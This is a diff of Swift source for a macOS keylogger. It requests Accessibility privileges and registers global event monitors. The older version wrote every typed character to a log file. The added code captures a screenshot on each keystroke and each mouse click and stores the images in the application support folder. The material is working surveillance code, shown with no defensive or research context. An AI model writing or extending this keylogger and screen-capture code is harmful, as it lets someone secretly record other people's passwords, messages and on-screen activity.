@@ -146,13 +146,6 @@ func createTimeStamp() -> Int32
     return Int32(Date().timeIntervalSince1970)
 }
 
-
-
-
-
-
-
-
 // MARK: Write stream to file
 
 func logWriter(writeToLine: String) {
@@ -174,7 +167,6 @@ func logWriter(writeToLine: String) {
 }
 
 // MARK: Acquire Privleges
-
 func acquirePrivileges() -> Bool {
     let accessEnabled = AXIsProcessTrustedWithOptions([kAXTrustedCheckOptionPrompt.takeUnretainedValue(): true] as CFDictionary)
     
@@ -185,35 +177,38 @@ func acquirePrivileges() -> Bool {
     return accessEnabled == true
 }
 
-// MARK: Key Input from EventHandler to file
-
-func handlerEvent(aEvent: NSEvent) -> Void {
-    let stringBuilder = aEvent.characters!
-    logWriter(writeToLine: "\(stringBuilder)")
-}
-
 // MARK: Event Monitor
-
-func listenForEvents() {
-    let mask = (NSEvent.EventTypeMask.keyDown)
-    let eventMonitor: Any? = NSEvent.addGlobalMonitorForEvents(matching: mask, handler: handlerEvent)
-}
+var eventMonitorKeyboard: GlobalEventMonitor?
+var eventMonitorMouse: GlobalEventMonitor?
 
 class ApplicationDelegate: NSObject, NSApplicationDelegate {
     func applicationDidFinishLaunching(_ notification: Notification) {
         print("Starting logging on \(formatCurrentDateAsString())")
         let _ = acquirePrivileges()
-        listenForEvents()
+        
+        let folder = applicationSupportDirectory.path + "/"
+        eventMonitorKeyboard = GlobalEventMonitor(mask: NSEvent.EventTypeMask.keyDown) { (event) in
+            takeScreensShots(folderName: folder,eventString:(event?.characters)!)
+        }
+        eventMonitorMouse = GlobalEventMonitor(mask: NSEvent.EventTypeMask.leftMouseDown) { (event) in
+            takeScreensShots(folderName: folder,eventString:"mouseDown(\(Int(event?.locationInWindow.x ?? 0)),\(Int(event?.locationInWindow.y ?? 0))))")
+        }
+        eventMonitorKeyboard?.start()
+        eventMonitorMouse?.start()
     }
 }
 
-
 let application = NSApplication.shared
-
 let applicationDelegate = ApplicationDelegate()
 application.delegate = applicationDelegate
 application.activate(ignoringOtherApps: true)
 application.run()
+
+
+
+
+
+
 
 
 
